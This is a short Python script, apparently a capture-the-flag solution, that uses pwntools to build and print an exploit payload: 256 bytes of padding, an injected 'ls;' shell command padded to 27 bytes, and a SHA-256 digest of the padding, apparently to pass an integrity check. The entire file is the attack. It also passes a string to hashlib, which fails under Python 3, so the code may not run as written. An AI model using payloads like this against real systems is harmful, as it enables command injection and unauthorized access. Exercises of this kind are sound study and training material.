from pwn import *
import hashlib
payload = "a"*256 + "ls;".ljust(27,"t") + hashlib.sha256("a"*256).hexdigest()
print(payload)
